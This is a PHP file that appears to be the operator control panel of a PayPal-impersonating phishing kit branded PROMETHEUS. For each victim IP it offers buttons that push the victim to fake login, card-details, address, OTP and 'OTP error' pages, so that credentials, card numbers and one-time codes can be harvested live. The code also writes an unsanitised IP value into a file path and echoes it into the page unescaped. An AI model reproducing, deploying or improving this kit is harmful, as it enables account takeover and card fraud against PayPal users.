<?php
session_start();
require_once 'config.php';


if (!isset($_GET['ip']) || empty($_GET['ip'])) {
    die('Invalid IP address');
}

$user_ip = $_GET['ip'];


if (isset($_POST['action']) && isset($_POST['redirect_to'])) {
    $redirect_to = $_POST['redirect_to'];
    $ip_file = "sessions/{$user_ip}.json";
    

    if (!is_dir('sessions')) {
        mkdir('sessions', 0777, true);
    }
    

    $redirect_data = [
        'redirect_to' => $redirect_to,
        'timestamp' => time()
    ];
    
    file_put_contents($ip_file, json_encode($redirect_data));
    
    echo json_encode(['success' => true, 'message' => 'User will be redirected to ' . $redirect_to]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paypal Panel - IP <?php echo htmlspecialchars($user_ip); ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .admin-panel {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 32px;
            max-width: 600px;
            width: 100%;
        }
        
        .admin-panel h1 {
            color: #202124;
            margin-bottom: 8px;
            font-size: 24px;
            font-weight: 400;
        }
        
        .session-info {
            background: #f8f9fa;
            padding: 16px;
            border-radius: 4px;
            margin-bottom: 32px;
            border-left: 3px solid #1a73e8;
        }
        
        .session-info p {
            color: #5f6368;
            margin: 4px 0;
            font-size: 14px;
        }
        
        .redirect-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
            margin-bottom: 32px;
        }
        
        .redirect-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: background-color 0.2s ease;
            text-align: center;
        }
        
        .redirect-btn:hover {
            background: #1557b0;
        }
        
        .redirect-btn:focus {
            outline: none;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.3);
        }
        
        .redirect-btn.login { background: #1a73e8; }
        .redirect-btn.card { background: #137333; }
        .redirect-btn.address { background: #b06000; }
        .redirect-btn.otp { background: #9334e6; }
        .redirect-btn.otp-error { background: #d93025; }
        .redirect-btn.success { background: #137333; }
        
        .redirect-btn.login:hover { background: #1557b0; }
        .redirect-btn.card:hover { background: #0f5132; }
        .redirect-btn.address:hover { background: #8f4700; }
        .redirect-btn.otp:hover { background: #7c2d92; }
        .redirect-btn.otp-error:hover { background: #b52d20; }
        .redirect-btn.success:hover { background: #0f5132; }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 4px;
            display: none;
            font-size: 14px;
        }
        
        .status.success {
            background: #e8f5e8;
            color: #137333;
            border: 1px solid #ceead6;
        }
        
        .status.error {
            background: #fce8e6;
            color: #d93025;
            border: 1px solid #f9dedc;
        }
        
        .footer {
            margin-top: 24px;
            color: #5f6368;
            font-size: 13px;
            text-align: center;
        }
        
        @media (max-width: 768px) {
            .admin-panel {
                padding: 24px;
                margin: 16px;
            }
            
            .redirect-buttons {
                grid-template-columns: 1fr;
            }
            
            .admin-panel h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="admin-panel">
        <h1>PROMETHEUS</h1>
        
        <div class="session-info">
            <p><strong>Session ID:</strong> <?php echo session_id(); ?></p>
            <p><strong>User IP:</strong> <?php echo $user_ip; ?></p>
            <p><strong>Status:</strong> Active</p>
        </div>
        
        <div class="redirect-buttons">
            <button class="redirect-btn login" onclick="redirectUser('login')">Login Page</button>
            <button class="redirect-btn card" onclick="redirectUser('card')">Card Details</button>
            <button class="redirect-btn address" onclick="redirectUser('address')">Address Info</button>
            <button class="redirect-btn otp" onclick="redirectUser('otp')">OTP Page</button>
            <button class="redirect-btn otp-error" onclick="redirectUser('otp-error')">OTP Error</button>
            <button class="redirect-btn success" onclick="redirectUser('success')">Success Page</button>
        </div>
        
        <div id="status" class="status"></div>
        
        <div class="footer">
            Admin Dashboard - Secure Access Only
        </div>
    </div>

    <script>
        function redirectUser(page) {
            const statusDiv = document.getElementById('status');
            
            // Show loading state
            statusDiv.className = 'status';
            statusDiv.style.display = 'block';
            statusDiv.innerHTML = '⏳ Redirecting user...';
            
            fetch('admin.php?ip=<?php echo urlencode($user_ip); ?>', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=redirect&redirect_to=' + encodeURIComponent(page)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusDiv.className = 'status success';
                    statusDiv.innerHTML = '✅ ' + data.message;
                } else {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Failed to redirect user';
                }
            })
            .catch(error => {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Error: ' + error.message;
            });
        }
        

        setInterval(() => {

        }, 5000);
    </script>
</body>
</html>